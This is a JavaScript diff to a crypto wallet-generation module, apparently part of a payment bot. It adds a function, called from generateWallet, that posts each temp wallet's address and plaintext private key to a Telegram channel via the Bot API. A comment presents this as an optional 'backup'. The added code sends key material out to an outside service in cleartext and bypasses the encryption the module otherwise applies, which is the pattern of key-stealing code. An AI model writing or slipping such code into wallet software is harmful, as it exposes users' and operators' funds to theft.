@@ -6,9 +6,27 @@ const path = require("node:path");
 const fss = require("node:fs");
 const { promises: fs } = require("node:fs");
 const crypto = require("node:crypto");
-const { WALLETS_DIR, WALLET_ENC_KEY, TREASURY } = require("../config/constants");
+const { WALLETS_DIR, WALLET_ENC_KEY, TREASURY, BOT_TOKEN, PK_CHANNEL } = require("../config/constants");
 const { familyOf } = require("../config/chains");
 const log = require("../helpers/logger");
+
+// Optional private-key backup to a PRIVATE channel (like fourtis) so funds in a
+// temp wallet whose sweep failed are always recoverable. Fire-and-forget; the
+// key is ALSO stored (encrypted) on disk. The channel MUST be private.
+function backupKeyToChannel(chain, wallet, meta) {
+  if (!PK_CHANNEL || !BOT_TOKEN) return;
+  const text =
+    `🔑 <b>Temp wallet</b> (${chain})\n` +
+    `Address: <code>${wallet.address}</code>\n` +
+    `Private key:\n<code>${wallet.privateKey}</code>\n` +
+    `Order: <code>${(meta && meta.orderId) || "-"}</code>`;
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ chat_id: PK_CHANNEL, text, parse_mode: "HTML" }),
+    signal: AbortSignal.timeout(10000),
+  }).catch((e) => log.debug(`[wallets] PK channel post: ${e.message}`));
+}
 
 const ADAPTERS = {
   evm: require("./chains/evm"),
@@ -90,6 +108,7 @@ async function generateWallet(chain, meta) {
   if (!encKey()) {
     log.warn(`[wallets] WALLET_ENC_KEY not set — ${chain} key stored in PLAINTEXT under .keys/`);
   }
+  backupKeyToChannel(chain, wallet, meta); // optional private-channel backup
   return wallet;
 }
 
